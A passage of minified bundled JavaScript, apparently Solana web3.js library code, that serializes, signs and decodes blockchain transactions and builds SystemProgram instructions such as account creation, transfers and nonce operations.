                        const r = this.serializeAddressTableLookups(),
                            i = Array();
                        rr(i, this.addressTableLookups.length);
                        const o = Ne.n_([Ne.u8("prefix"), Ne.n_([Ne.u8("numRequiredSignatures"), Ne.u8("numReadonlySignedAccounts"), Ne.u8("numReadonlyUnsignedAccounts")], "header"), Ne.Ik(e.length, "staticAccountKeysLength"), Ne.A9(Xn(), this.staticAccountKeys.length, "staticAccountKeys"), Xn("recentBlockhash"), Ne.Ik(n.length, "instructionsLength"), Ne.Ik(t.length, "serializedInstructions"), Ne.Ik(i.length, "addressTableLookupsLength"), Ne.Ik(r.length, "serializedAddressTableLookups")]),
                            s = new Uint8Array(Vn),
                            a = o.encode({
                                prefix: 128,
                                header: this.header,
                                staticAccountKeysLength: new Uint8Array(e),
                                staticAccountKeys: this.staticAccountKeys.map((e => e.toBytes())),
                                recentBlockhash: xe().decode(this.recentBlockhash),
                                instructionsLength: new Uint8Array(n),
                                serializedInstructions: t,
                                addressTableLookupsLength: new Uint8Array(i),
                                serializedAddressTableLookups: r
                            }, s);
                        return s.slice(0, a)
                    }
                    serializeInstructions() {
                        let e = 0;
                        const t = new Uint8Array(Vn);
                        for (const n of this.compiledInstructions) {
                            const r = Array();
                            rr(r, n.accountKeyIndexes.length);
                            const i = Array();
                            rr(i, n.data.length);
                            e += Ne.n_([Ne.u8("programIdIndex"), Ne.Ik(r.length, "encodedAccountKeyIndexesLength"), Ne.A9(Ne.u8(), n.accountKeyIndexes.length, "accountKeyIndexes"), Ne.Ik(i.length, "encodedDataLength"), Ne.Ik(n.data.length, "data")]).encode({
                                programIdIndex: n.programIdIndex,
                                encodedAccountKeyIndexesLength: new Uint8Array(r),
                                accountKeyIndexes: n.accountKeyIndexes,
                                encodedDataLength: new Uint8Array(i),
                                data: n.data
                            }, t, e)
                        }
                        return t.slice(0, e)
                    }
                    serializeAddressTableLookups() {
                        let e = 0;
                        const t = new Uint8Array(Vn);
                        for (const n of this.addressTableLookups) {
                            const r = Array();
                            rr(r, n.writableIndexes.length);
                            const i = Array();
                            rr(i, n.readonlyIndexes.length);
                            e += Ne.n_([Xn("accountKey"), Ne.Ik(r.length, "encodedWritableIndexesLength"), Ne.A9(Ne.u8(), n.writableIndexes.length, "writableIndexes"), Ne.Ik(i.length, "encodedReadonlyIndexesLength"), Ne.A9(Ne.u8(), n.readonlyIndexes.length, "readonlyIndexes")]).encode({
                                accountKey: n.accountKey.toBytes(),
                                encodedWritableIndexesLength: new Uint8Array(r),
                                writableIndexes: n.writableIndexes,
                                encodedReadonlyIndexesLength: new Uint8Array(i),
                                readonlyIndexes: n.readonlyIndexes
                            }, t, e)
                        }
                        return t.slice(0, e)
                    }
                    static deserialize(e) {
                        let t = [...e];
                        const n = t.shift(),
                            r = n & Qn;
                        ir(n !== r, "Expected versioned message but received legacy message");
                        ir(0 === r, `Expected versioned message with version 0 but found version ${r}`);
                        const i = {
                                numRequiredSignatures: t.shift(),
                                numReadonlySignedAccounts: t.shift(),
                                numReadonlyUnsignedAccounts: t.shift()
                            },
                            o = [],
                            s = nr(t);
                        for (let h = 0; h < s; h++) o.push(new Wn(t.splice(0, Fn)));
                        const a = xe().encode(t.splice(0, Fn)),
                            u = nr(t),
                            c = [];
                        for (let h = 0; h < u; h++) {
                            const e = t.shift(),
                                n = nr(t),
                                r = t.splice(0, n),
                                i = nr(t),
                                o = new Uint8Array(t.splice(0, i));
                            c.push({
                                programIdIndex: e,
                                accountKeyIndexes: r,
                                data: o
                            })
                        }
                        const l = nr(t),
                            f = [];
                        for (let h = 0; h < l; h++) {
                            const e = new Wn(t.splice(0, Fn)),
                                n = nr(t),
                                r = t.splice(0, n),
                                i = nr(t),
                                o = t.splice(0, i);
                            f.push({
                                accountKey: e,
                                writableIndexes: r,
                                readonlyIndexes: o
                            })
                        }
                        return new ar({
                            header: i,
                            staticAccountKeys: o,
                            recentBlockhash: a,
                            compiledInstructions: c,
                            addressTableLookups: f
                        })
                    }
                }
                const ur = {
                    deserializeMessageVersion(e) {
                        const t = e[0],
                            n = t & Qn;
                        return n === t ? "legacy" : n
                    },
                    deserialize: e => {
                        const t = ur.deserializeMessageVersion(e);
                        if ("legacy" === t) return sr.from(e);
                        if (0 === t) return ar.deserialize(e);
                        throw new Error(`Transaction message version ${t} deserialization is not supported`)
                    }
                };
                let cr;
                ! function(e) {
                    e[e.BLOCKHEIGHT_EXCEEDED = 0] = "BLOCKHEIGHT_EXCEEDED", e[e.PROCESSED = 1] = "PROCESSED", e[e.TIMED_OUT = 2] = "TIMED_OUT"
                }(cr || (cr = {}));
                const lr = r.lW.alloc(Gn).fill(0);
                class fr {
                    constructor(e) {
                        this.keys = void 0, this.programId = void 0, this.data = r.lW.alloc(0), this.programId = e.programId, this.keys = e.keys, e.data && (this.data = e.data)
                    }
                    toJSON() {
                        return {
                            keys: this.keys.map((e => {
                                let {
                                    pubkey: t,
                                    isSigner: n,
                                    isWritable: r
                                } = e;
                                return {
                                    pubkey: t.toJSON(),
                                    isSigner: n,
                                    isWritable: r
                                }
                            })),
                            programId: this.programId.toJSON(),
                            data: [...this.data]
                        }
                    }
                }
                class hr {
                    get signature() {
                        return this.signatures.length > 0 ? this.signatures[0].signature : null
                    }
                    constructor(e) {
                        if (this.signatures = [], this.feePayer = void 0, this.instructions = [], this.recentBlockhash = void 0, this.lastValidBlockHeight = void 0, this.nonceInfo = void 0, this._message = void 0, this._json = void 0, e)
                            if (e.feePayer && (this.feePayer = e.feePayer), e.signatures && (this.signatures = e.signatures), Object.prototype.hasOwnProperty.call(e, "lastValidBlockHeight")) {
                                const {
                                    blockhash: t,
                                    lastValidBlockHeight: n
                                } = e;
                                this.recentBlockhash = t, this.lastValidBlockHeight = n
                            } else {
                                const {
                                    recentBlockhash: t,
                                    nonceInfo: n
                                } = e;
                                n && (this.nonceInfo = n), this.recentBlockhash = t
                            }
                    }
                    toJSON() {
                        return {
                            recentBlockhash: this.recentBlockhash || null,
                            feePayer: this.feePayer ? this.feePayer.toJSON() : null,
                            nonceInfo: this.nonceInfo ? {
                                nonce: this.nonceInfo.nonce,
                                nonceInstruction: this.nonceInfo.nonceInstruction.toJSON()
                            } : null,
                            instructions: this.instructions.map((e => e.toJSON())),
                            signers: this.signatures.map((e => {
                                let {
                                    publicKey: t
                                } = e;
                                return t.toJSON()
                            }))
                        }
                    }
                    add() {
                        for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                        if (0 === t.length) throw new Error("No instructions");
                        return t.forEach((e => {
                            "instructions" in e ? this.instructions = this.instructions.concat(e.instructions) : "data" in e && "programId" in e && "keys" in e ? this.instructions.push(e) : this.instructions.push(new fr(e))
                        })), this
                    }
                    compileMessage() {
                        if (this._message && JSON.stringify(this.toJSON()) === JSON.stringify(this._json)) return this._message;
                        let e, t, n;
                        if (this.nonceInfo ? (e = this.nonceInfo.nonce, t = this.instructions[0] != this.nonceInfo.nonceInstruction ? [this.nonceInfo.nonceInstruction, ...this.instructions] : this.instructions) : (e = this.recentBlockhash, t = this.instructions), !e) throw new Error("Transaction recentBlockhash required");
                        if (t.length < 1 && console.warn("No instructions provided"), this.feePayer) n = this.feePayer;
                        else {
                            if (!(this.signatures.length > 0 && this.signatures[0].publicKey)) throw new Error("Transaction fee payer required");
                            n = this.signatures[0].publicKey
                        }
                        for (let p = 0; p < t.length; p++)
                            if (void 0 === t[p].programId) throw new Error(`Transaction instruction index ${p} has undefined program id`);
                        const r = [],
                            i = [];
                        t.forEach((e => {
                            e.keys.forEach((e => {
                                i.push({ ...e
                                })
                            }));
                            const t = e.programId.toString();
                            r.includes(t) || r.push(t)
                        })), r.forEach((e => {
                            i.push({
                                pubkey: new Wn(e),
                                isSigner: !1,
                                isWritable: !1
                            })
                        }));
                        const o = [];
                        i.forEach((e => {
                            const t = e.pubkey.toString(),
                                n = o.findIndex((e => e.pubkey.toString() === t));
                            n > -1 ? (o[n].isWritable = o[n].isWritable || e.isWritable, o[n].isSigner = o[n].isSigner || e.isSigner) : o.push(e)
                        })), o.sort((function(e, t) {
                            return e.isSigner !== t.isSigner ? e.isSigner ? -1 : 1 : e.isWritable !== t.isWritable ? e.isWritable ? -1 : 1 : e.pubkey.toBase58().localeCompare(t.pubkey.toBase58())
                        }));
                        const s = o.findIndex((e => e.pubkey.equals(n)));
                        if (s > -1) {
                            const [e] = o.splice(s, 1);
                            e.isSigner = !0, e.isWritable = !0, o.unshift(e)
                        } else o.unshift({
                            pubkey: n,
                            isSigner: !0,
                            isWritable: !0
                        });
                        for (const p of this.signatures) {
                            const e = o.findIndex((e => e.pubkey.equals(p.publicKey)));
                            if (!(e > -1)) throw new Error(`unknown signer: ${p.publicKey.toString()}`);
                            o[e].isSigner || (o[e].isSigner = !0, console.warn("Transaction references a signature that is unnecessary, only the fee payer and instruction signer accounts should sign a transaction. This behavior is deprecated and will throw an error in the next major version release."))
                        }
                        let a = 0,
                            u = 0,
                            c = 0;
                        const l = [],
                            f = [];
                        o.forEach((e => {
                            let {
                                pubkey: t,
                                isSigner: n,
                                isWritable: r
                            } = e;
                            n ? (l.push(t.toString()), a += 1, r || (u += 1)) : (f.push(t.toString()), r || (c += 1))
                        }));
                        const h = l.concat(f),
                            d = t.map((e => {
                                const {
                                    data: t,
                                    programId: n
                                } = e;
                                return {
                                    programIdIndex: h.indexOf(n.toString()),
                                    accounts: e.keys.map((e => h.indexOf(e.pubkey.toString()))),
                                    data: xe().encode(t)
                                }
                            }));
                        return d.forEach((e => {
                            ir(e.programIdIndex >= 0), e.accounts.forEach((e => ir(e >= 0)))
                        })), new sr({
                            header: {
                                numRequiredSignatures: a,
                                numReadonlySignedAccounts: u,
                                numReadonlyUnsignedAccounts: c
                            },
                            accountKeys: h,
                            recentBlockhash: e,
                            instructions: d
                        })
                    }
                    _compile() {
                        const e = this.compileMessage(),
                            t = e.accountKeys.slice(0, e.header.numRequiredSignatures);
                        if (this.signatures.length === t.length) {
                            if (this.signatures.every(((e, n) => t[n].equals(e.publicKey)))) return e
                        }
                        return this.signatures = t.map((e => ({
                            signature: null,
                            publicKey: e
                        }))), e
                    }
                    serializeMessage() {
                        return this._compile().serialize()
                    }
                    async getEstimatedFee(e) {
                        return (await e.getFeeForMessage(this.compileMessage())).value
                    }
                    setSigners() {
                        for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                        if (0 === t.length) throw new Error("No signers");
                        const r = new Set;
                        this.signatures = t.filter((e => {
                            const t = e.toString();
                            return !r.has(t) && (r.add(t), !0)
                        })).map((e => ({
                            signature: null,
                            publicKey: e
                        })))
                    }
                    sign() {
                        for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                        if (0 === t.length) throw new Error("No signers");
                        const r = new Set,
                            i = [];
                        for (const s of t) {
                            const e = s.publicKey.toString();
                            r.has(e) || (r.add(e), i.push(s))
                        }
                        this.signatures = i.map((e => ({
                            signature: null,
                            publicKey: e.publicKey
                        })));
                        const o = this._compile();
                        this._partialSign(o, ...i)
                    }
                    partialSign() {
                        for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                        if (0 === t.length) throw new Error("No signers");
                        const r = new Set,
                            i = [];
                        for (const s of t) {
                            const e = s.publicKey.toString();
                            r.has(e) || (r.add(e), i.push(s))
                        }
                        const o = this._compile();
                        this._partialSign(o, ...i)
                    }
                    _partialSign(e) {
                        const t = e.serialize();
                        for (var n = arguments.length, r = new Array(n > 1 ? n - 1 : 0), i = 1; i < n; i++) r[i - 1] = arguments[i];
                        r.forEach((e => {
                            const n = Ln(t, e.secretKey);
                            this._addSignature(e.publicKey, Rn(n))
                        }))
                    }
                    addSignature(e, t) {
                        this._compile(), this._addSignature(e, t)
                    }
                    _addSignature(e, t) {
                        ir(64 === t.length);
                        const n = this.signatures.findIndex((t => e.equals(t.publicKey)));
                        if (n < 0) throw new Error(`unknown signer: ${e.toString()}`);
                        this.signatures[n].signature = r.lW.from(t)
                    }
                    verifySignatures() {
                        return this._verifySignatures(this.serializeMessage(), !0)
                    }
                    _verifySignatures(e, t) {
                        for (const {
                                signature: n,
                                publicKey: r
                            } of this.signatures)
                            if (null === n) {
                                if (t) return !1
                            } else if (!Nn(n, e, r.toBuffer())) return !1;
                        return !0
                    }
                    serialize(e) {
                        const {
                            requireAllSignatures: t,
                            verifySignatures: n
                        } = Object.assign({
                            requireAllSignatures: !0,
                            verifySignatures: !0
                        }, e), r = this.serializeMessage();
                        if (n && !this._verifySignatures(r, t)) throw new Error("Signature verification failed");
                        return this._serialize(r)
                    }
                    _serialize(e) {
                        const {
                            signatures: t
                        } = this, n = [];
                        rr(n, t.length);
                        const i = n.length + 64 * t.length + e.length,
                            o = r.lW.alloc(i);
                        return ir(t.length < 256), r.lW.from(n).copy(o, 0), t.forEach(((e, t) => {
                            let {
                                signature: i
                            } = e;
                            null !== i && (ir(64 === i.length, "signature has invalid length"), r.lW.from(i).copy(o, n.length + 64 * t))
                        })), e.copy(o, n.length + 64 * t.length), ir(o.length <= Vn, `Transaction too large: ${o.length} > ${Vn}`), o
                    }
                    get keys() {
                        return ir(1 === this.instructions.length), this.instructions[0].keys.map((e => e.pubkey))
                    }
                    get programId() {
                        return ir(1 === this.instructions.length), this.instructions[0].programId
                    }
                    get data() {
                        return ir(1 === this.instructions.length), this.instructions[0].data
                    }
                    static from(e) {
                        let t = [...e];
                        const n = nr(t);
                        let i = [];
                        for (let o = 0; o < n; o++) {
                            const e = t.slice(0, Gn);
                            t = t.slice(Gn), i.push(xe().encode(r.lW.from(e)))
                        }
                        return hr.populate(sr.from(t), i)
                    }
                    static populate(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : [];
                        const n = new hr;
                        return n.recentBlockhash = e.recentBlockhash, e.header.numRequiredSignatures > 0 && (n.feePayer = e.accountKeys[0]), t.forEach(((t, r) => {
                            const i = {
                                signature: t == xe().encode(lr) ? null : xe().decode(t),
                                publicKey: e.accountKeys[r]
                            };
                            n.signatures.push(i)
                        })), e.instructions.forEach((t => {
                            const r = t.accounts.map((t => {
                                const r = e.accountKeys[t];
                                return {
                                    pubkey: r,
                                    isSigner: n.signatures.some((e => e.publicKey.toString() === r.toString())) || e.isAccountSigner(t),
                                    isWritable: e.isAccountWritable(t)
                                }
                            }));
                            n.instructions.push(new fr({
                                keys: r,
                                programId: e.accountKeys[t.programIdIndex],
                                data: xe().decode(t.data)
                            }))
                        })), n._message = e, n._json = n.toJSON(), n
                    }
                }
                class dr {
                    constructor(e) {
                        this.payerKey = void 0, this.instructions = void 0, this.recentBlockhash = void 0, this.payerKey = e.payerKey, this.instructions = e.instructions, this.recentBlockhash = e.recentBlockhash
                    }
                    static decompile(e, t) {
                        const {
                            header: n,
                            compiledInstructions: r,
                            recentBlockhash: i
                        } = e, {
                            numRequiredSignatures: o,
                            numReadonlySignedAccounts: s,
                            numReadonlyUnsignedAccounts: a
                        } = n, u = o - s;
                        ir(u > 0, "Message header is invalid");
                        const c = e.staticAccountKeys.length - a;
                        ir(c >= 0, "Message header is invalid");
                        const l = e.getAccountKeys(t),
                            f = l.get(0);
                        if (void 0 === f) throw new Error("Failed to decompile message because no account keys were found");
                        const h = [];
                        for (const d of r) {
                            const e = [];
                            for (const r of d.accountKeyIndexes) {
                                const t = l.get(r);
                                if (void 0 === t) throw new Error(`Failed to find key for account key index ${r}`);
                                let i;
                                i = r < o ? r < u : r < l.staticAccountKeys.length ? r - o < c : r - l.staticAccountKeys.length < l.accountKeysFromLookups.writable.length, e.push({
                                    pubkey: t,
                                    isSigner: r < n.numRequiredSignatures,
                                    isWritable: i
                                })
                            }
                            const t = l.get(d.programIdIndex);
                            if (void 0 === t) throw new Error(`Failed to find program id for program id index ${d.programIdIndex}`);
                            h.push(new fr({
                                programId: t,
                                data: Rn(d.data),
                                keys: e
                            }))
                        }
                        return new dr({
                            payerKey: f,
                            instructions: h,
                            recentBlockhash: i
                        })
                    }
                    compileToLegacyMessage() {
                        return sr.compile({
                            payerKey: this.payerKey,
                            recentBlockhash: this.recentBlockhash,
                            instructions: this.instructions
                        })
                    }
                    compileToV0Message(e) {
                        return ar.compile({
                            payerKey: this.payerKey,
                            recentBlockhash: this.recentBlockhash,
                            instructions: this.instructions,
                            addressLookupTableAccounts: e
                        })
                    }
                }
                class pr {
                    get version() {
                        return this.message.version
                    }
                    constructor(e, t) {
                        if (this.signatures = void 0, this.message = void 0, void 0 !== t) ir(t.length === e.header.numRequiredSignatures, "Expected signatures length to be equal to the number of required signatures"), this.signatures = t;
                        else {
                            const t = [];
                            for (let n = 0; n < e.header.numRequiredSignatures; n++) t.push(new Uint8Array(Gn));
                            this.signatures = t
                        }
                        this.message = e
                    }
                    serialize() {
                        const e = this.message.serialize(),
                            t = Array();
                        rr(t, this.signatures.length);
                        const n = Ne.n_([Ne.Ik(t.length, "encodedSignaturesLength"), Ne.A9($n(), this.signatures.length, "signatures"), Ne.Ik(e.length, "serializedMessage")]),
                            r = new Uint8Array(2048),
                            i = n.encode({
                                encodedSignaturesLength: new Uint8Array(t),
                                signatures: this.signatures,
                                serializedMessage: e
                            }, r);
                        return r.slice(0, i)
                    }
                    static deserialize(e) {
                        let t = [...e];
                        const n = [],
                            r = nr(t);
                        for (let o = 0; o < r; o++) n.push(new Uint8Array(t.splice(0, Gn)));
                        const i = ur.deserialize(new Uint8Array(t));
                        return new pr(i, n)
                    }
                    sign(e) {
                        const t = this.message.serialize(),
                            n = this.message.staticAccountKeys.slice(0, this.message.header.numRequiredSignatures);
                        for (const r of e) {
                            const e = n.findIndex((e => e.equals(r.publicKey)));
                            ir(e >= 0, `Cannot sign with non signer key ${r.publicKey.toBase58()}`), this.signatures[e] = Ln(t, r.secretKey)
                        }
                    }
                    addSignature(e, t) {
                        ir(64 === t.byteLength, "Signature must be 64 bytes long");
                        const n = this.message.staticAccountKeys.slice(0, this.message.header.numRequiredSignatures).findIndex((t => t.equals(e)));
                        ir(n >= 0, `Can not add signature; \`${e.toBase58()}\` is not required to sign this transaction`), this.signatures[n] = t
                    }
                }
                const yr = new Wn("SysvarC1ock11111111111111111111111111111111"),
                    gr = new Wn("SysvarEpochSchedu1e111111111111111111111111"),
                    mr = new Wn("Sysvar1nstructions1111111111111111111111111"),
                    wr = new Wn("SysvarRecentB1ockHashes11111111111111111111"),
                    br = new Wn("SysvarRent111111111111111111111111111111111"),
                    vr = new Wn("SysvarRewards111111111111111111111111111111"),
                    Ar = new Wn("SysvarS1otHashes111111111111111111111111111"),
                    kr = new Wn("SysvarS1otHistory11111111111111111111111111"),
                    _r = new Wn("SysvarStakeHistory1111111111111111111111111");
                async function Er(e, t, n, r) {
                    const i = r && {
                            skipPreflight: r.skipPreflight,
                            preflightCommitment: r.preflightCommitment || r.commitment,
                            maxRetries: r.maxRetries,
                            minContextSlot: r.minContextSlot
                        },
                        o = await e.sendTransaction(t, n, i),
                        s = null != t.recentBlockhash && null != t.lastValidBlockHeight ? (await e.confirmTransaction({
                            signature: o,
                            blockhash: t.recentBlockhash,
                            lastValidBlockHeight: t.lastValidBlockHeight
                        }, r && r.commitment)).value : (await e.confirmTransaction(o, r && r.commitment)).value;
                    if (s.err) throw new Error(`Transaction ${o} failed (${JSON.stringify(s)})`);
                    return o
                }

                function Sr(e) {
                    return new Promise((t => setTimeout(t, e)))
                }

                function Ir(e, t) {
                    const n = e.layout.span >= 0 ? e.layout.span : tr(e, t),
                        i = r.lW.alloc(n),
                        o = Object.assign({
                            instruction: e.index
                        }, t);
                    return e.layout.encode(o, i), i
                }

                function xr(e, t) {
                    let n;
                    try {
                        n = e.layout.decode(t)
                    } catch (r) {
                        throw new Error("invalid instruction; " + r)
                    }
                    if (n.instruction !== e.index) throw new Error(`invalid instruction; instruction index mismatch ${n.instruction} != ${e.index}`);
                    return n
                }
                const Mr = Ne._O("lamportsPerSignature"),
                    Br = Ne.n_([Ne.Jq("version"), Ne.Jq("state"), Xn("authorizedPubkey"), Xn("nonce"), Ne.n_([Mr], "feeCalculator")]),
                    Tr = Br.span;
                class Or {
                    constructor(e) {
                        this.authorizedPubkey = void 0, this.nonce = void 0, this.feeCalculator = void 0, this.authorizedPubkey = e.authorizedPubkey, this.nonce = e.nonce, this.feeCalculator = e.feeCalculator
                    }
                    static fromAccountData(e) {
                        const t = Br.decode(Rn(e), 0);
                        return new Or({
                            authorizedPubkey: new Wn(t.authorizedPubkey),
                            nonce: new Wn(t.nonce).toString(),
                            feeCalculator: t.feeCalculator
                        })
                    }
                }
                const Cr = (Pr = 8, e => {
                    const t = (0, Ne.Ik)(Pr, e),
                        {
                            encode: n,
                            decode: i
                        } = (e => ({
                            decode: e.decode.bind(e),
                            encode: e.encode.bind(e)
                        }))(t),
                        o = t;
                    return o.decode = (e, t) => {
                        const n = i(e, t);
                        return (0, Re.oU)(r.lW.from(n))
                    }, o.encode = (e, t, r) => {
                        const i = (0, Re.k$)(e, Pr);
                        return n(i, t, r)
                    }, o
                });
                var Pr;
                class Lr {
                    constructor() {}
                    static decodeInstructionType(e) {
                        this.checkProgramId(e.programId);
                        const t = Ne.Jq("instruction").decode(e.data);
                        let n;
                        for (const [r, i] of Object.entries(Nr))
                            if (i.index == t) {
                                n = r;
                                break
                            }
                        if (!n) throw new Error("Instruction type incorrect; not a SystemInstruction");
                        return n
                    }
                    static decodeCreateAccount(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 2);
                        const {
                            lamports: t,
                            space: n,
                            programId: r
                        } = xr(Nr.Create, e.data);
                        return {
                            fromPubkey: e.keys[0].pubkey,
                            newAccountPubkey: e.keys[1].pubkey,
                            lamports: t,
                            space: n,
                            programId: new Wn(r)
                        }
                    }
                    static decodeTransfer(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 2);
                        const {
                            lamports: t
                        } = xr(Nr.Transfer, e.data);
                        return {
                            fromPubkey: e.keys[0].pubkey,
                            toPubkey: e.keys[1].pubkey,
                            lamports: t
                        }
                    }
                    static decodeTransferWithSeed(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 3);
                        const {
                            lamports: t,
                            seed: n,
                            programId: r
                        } = xr(Nr.TransferWithSeed, e.data);
                        return {
                            fromPubkey: e.keys[0].pubkey,
                            basePubkey: e.keys[1].pubkey,
                            toPubkey: e.keys[2].pubkey,
                            lamports: t,
                            seed: n,
                            programId: new Wn(r)
                        }
                    }
                    static decodeAllocate(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 1);
                        const {
                            space: t
                        } = xr(Nr.Allocate, e.data);
                        return {
                            accountPubkey: e.keys[0].pubkey,
                            space: t
                        }
                    }
                    static decodeAllocateWithSeed(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 1);
                        const {
                            base: t,
                            seed: n,
                            space: r,
                            programId: i
                        } = xr(Nr.AllocateWithSeed, e.data);
                        return {
                            accountPubkey: e.keys[0].pubkey,
                            basePubkey: new Wn(t),
                            seed: n,
                            space: r,
                            programId: new Wn(i)
                        }
                    }
                    static decodeAssign(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 1);
                        const {
                            programId: t
                        } = xr(Nr.Assign, e.data);
                        return {
                            accountPubkey: e.keys[0].pubkey,
                            programId: new Wn(t)
                        }
                    }
                    static decodeAssignWithSeed(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 1);
                        const {
                            base: t,
                            seed: n,
                            programId: r
                        } = xr(Nr.AssignWithSeed, e.data);
                        return {
                            accountPubkey: e.keys[0].pubkey,
                            basePubkey: new Wn(t),
                            seed: n,
                            programId: new Wn(r)
                        }
                    }
                    static decodeCreateWithSeed(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 2);
                        const {
                            base: t,
                            seed: n,
                            lamports: r,
                            space: i,
                            programId: o
                        } = xr(Nr.CreateWithSeed, e.data);
                        return {
                            fromPubkey: e.keys[0].pubkey,
                            newAccountPubkey: e.keys[1].pubkey,
                            basePubkey: new Wn(t),
                            seed: n,
                            lamports: r,
                            space: i,
                            programId: new Wn(o)
                        }
                    }
                    static decodeNonceInitialize(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 3);
                        const {
                            authorized: t
                        } = xr(Nr.InitializeNonceAccount, e.data);
                        return {
                            noncePubkey: e.keys[0].pubkey,
                            authorizedPubkey: new Wn(t)
                        }
                    }
                    static decodeNonceAdvance(e) {
                        return this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 3), xr(Nr.AdvanceNonceAccount, e.data), {
                            noncePubkey: e.keys[0].pubkey,
                            authorizedPubkey: e.keys[2].pubkey
                        }
                    }
                    static decodeNonceWithdraw(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 5);
                        const {
                            lamports: t
                        } = xr(Nr.WithdrawNonceAccount, e.data);
                        return {
                            noncePubkey: e.keys[0].pubkey,
                            toPubkey: e.keys[1].pubkey,
                            authorizedPubkey: e.keys[4].pubkey,
                            lamports: t
                        }
                    }
                    static decodeNonceAuthorize(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 2);
                        const {
                            authorized: t
                        } = xr(Nr.AuthorizeNonceAccount, e.data);
                        return {
                            noncePubkey: e.keys[0].pubkey,
                            authorizedPubkey: e.keys[1].pubkey,
                            newAuthorizedPubkey: new Wn(t)
                        }
                    }
                    static checkProgramId(e) {
                        if (!e.equals(Rr.programId)) throw new Error("invalid instruction; programId is not SystemProgram")
                    }
                    static checkKeyLength(e, t) {
                        if (e.length < t) throw new Error(`invalid instruction; found ${e.length} keys, expected at least ${t}`)
                    }
                }
                const Nr = Object.freeze({
                    Create: {
                        index: 0,
                        layout: Ne.n_([Ne.Jq("instruction"), Ne.gM("lamports"), Ne.gM("space"), Xn("programId")])
                    },
                    Assign: {
                        index: 1,
                        layout: Ne.n_([Ne.Jq("instruction"), Xn("programId")])
                    },
                    Transfer: {
                        index: 2,
                        layout: Ne.n_([Ne.Jq("instruction"), Cr("lamports")])
                    },
                    CreateWithSeed: {
                        index: 3,
                        layout: Ne.n_([Ne.Jq("instruction"), Xn("base"), er("seed"), Ne.gM("lamports"), Ne.gM("space"), Xn("programId")])
                    },
                    AdvanceNonceAccount: {
                        index: 4,
                        layout: Ne.n_([Ne.Jq("instruction")])
                    },
                    WithdrawNonceAccount: {
                        index: 5,
                        layout: Ne.n_([Ne.Jq("instruction"), Ne.gM("lamports")])
                    },
                    InitializeNonceAccount: {
                        index: 6,
                        layout: Ne.n_([Ne.Jq("instruction"), Xn("authorized")])
                    },
                    AuthorizeNonceAccount: {
                        index: 7,
                        layout: Ne.n_([Ne.Jq("instruction"), Xn("authorized")])
                    },
                    Allocate: {
                        index: 8,
                        layout: Ne.n_([Ne.Jq("instruction"), Ne.gM("space")])
                    },
                    AllocateWithSeed: {
                        index: 9,
                        layout: Ne.n_([Ne.Jq("instruction"), Xn("base"), er("seed"), Ne.gM("space"), Xn("programId")])
                    },
                    AssignWithSeed: {
                        index: 10,
                        layout: Ne.n_([Ne.Jq("instruction"), Xn("base"), er("seed"), Xn("programId")])
                    },
                    TransferWithSeed: {
                        index: 11,
                        layout: Ne.n_([Ne.Jq("instruction"), Cr("lamports"), er("seed"), Xn("programId")])
                    },
                    UpgradeNonceAccount: {
                        index: 12,
                        layout: Ne.n_([Ne.Jq("instruction")])
                    }
                });
                class Rr {
                    constructor() {}
                    static createAccount(e) {
                        const t = Ir(Nr.Create, {
                            lamports: e.lamports,
                            space: e.space,
                            programId: Rn(e.programId.toBuffer())
                        });
                        return new fr({
                            keys: [{
                                pubkey: e.fromPubkey,
                                isSigner: !0,
                                isWritable: !0
                            }, {
                                pubkey: e.newAccountPubkey,
                                isSigner: !0,
                                isWritable: !0
                            }],
                            programId: this.programId,
                            data: t
                        })
                    }
                    static transfer(e) {
                        let t, n;
                        if ("basePubkey" in e) {
                            t = Ir(Nr.TransferWithSeed, {
                                lamports: BigInt(e.lamports),
                                seed: e.seed,
                                programId: Rn(e.programId.toBuffer())
                            }), n = [{
                                pubkey: e.fromPubkey,
                                isSigner: !1,
                                isWritable: !0
                            }, {
                                pubkey: e.basePubkey,
                                isSigner: !0,
                                isWritable: !1
                            }, {
                                pubkey: e.toPubkey,
                                isSigner: !1,
                                isWritable: !0
                            }]
                        } else {
                            t = Ir(Nr.Transfer, {
                                lamports: BigInt(e.lamports)
                            }), n = [{
                                pubkey: e.fromPubkey,
                                isSigner: !0,
                                isWritable: !0
                            }, {
                                pubkey: e.toPubkey,
                                isSigner: !1,
                                isWritable: !0
                            }]
                        }
                        return new fr({
                            keys: n,
                            programId: this.programId,
                            data: t
                        })
                    }
                    static assign(e) {
                        let t, n;
                        if ("basePubkey" in e) {
                            t = Ir(Nr.AssignWithSeed, {
                                base: Rn(e.basePubkey.toBuffer()),
                                seed: e.seed,
                                programId: Rn(e.programId.toBuffer())
                            }), n = [{
                                pubkey: e.accountPubkey,
                                isSigner: !1,
                                isWritable: !0
                            }, {
                                pubkey: e.basePubkey,
                                isSigner: !0,
                                isWritable: !1
                            }]
                        } else {
                            t = Ir(Nr.Assign, {
                                programId: Rn(e.programId.toBuffer())
                            }), n = [{
                                pubkey: e.accountPubkey,
                                isSigner: !0,
                                isWritable: !0
                            }]
                        }
                        return new fr({
                            keys: n,
                            programId: this.programId,
                            data: t
                        })
                    }
                    static createAccountWithSeed(e) {
                        const t = Ir(Nr.CreateWithSeed, {
                            base: Rn(e.basePubkey.toBuffer()),
                            seed: e.seed,
                            lamports: e.lamports,
                            space: e.space,
                            programId: Rn(e.programId.toBuffer())
                        });
                        let n = [{
                            pubkey: e.fromPubkey,
